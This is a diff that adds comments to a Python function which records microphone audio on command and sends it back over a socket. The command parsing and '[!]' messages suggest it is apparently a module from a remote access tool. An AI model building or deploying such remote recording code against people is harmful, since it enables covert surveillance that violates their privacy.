@@ -1055,6 +1055,7 @@ def mic_record(socket, command):
         >>> mic_record(socket, "mic_record --duration 5")
     """
     try:
+        # Parse and validate the command structure
         parts = command.split()
         if len(parts) < 3 or parts[0] != "mic_record" or parts[1] != "--duration":
             socket_send(
@@ -1062,24 +1063,31 @@ def mic_record(socket, command):
             )
             return False
 
+        # Validate and convert duration parameter
         duration = int(parts[2])
         if duration <= 0:
             socket_send(socket, "[!] Error: Duration must be positive")
             return False
 
+        # Create a temporary WAV file (auto-deleted later)
         with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmpfile:
             temp_filename = tmpfile.name
 
         try:
-            fs = 44100
-            channels = 2
+            # Audio recording configuration
+            fs = 44100 # Sampling frequency (CD quality)
+            channels = 2 # Stereo recording
 
+            # Start audio recording
             recording = sd.rec(
                 int(duration * fs), samplerate=fs, channels=channels, dtype="int16"
             )
-            sd.wait()
+            sd.wait() # Block until recording completes
 
+            # Save recording to WAV file
             write(temp_filename, fs, recording)
+            
+            # Read WAV file and send through socket
             with open(temp_filename, "rb") as f:
                 audio_data = f.read()
 
@@ -1087,17 +1095,21 @@ def mic_record(socket, command):
             return True
 
         except Exception as e:
+            # Handle recording/processing errors
             socket_send(socket, f"[!] Recording Error: {str(e)}")
             return False
         finally:
+            # Cleanup: Delete temporary file in all cases
             try:
                 os.unlink(temp_filename)
             except:
-                pass
+                pass # Ignore file deletion errors
 
     except ValueError:
+        # Handle invalid duration format
         socket_send(socket, "[!] Error: Invalid duration value. Please provide a number")
         return False
     except Exception as e:
+        # Handle unexpected system errors
         socket_send(socket, f"[!] System Error: {str(e)}")
         return False
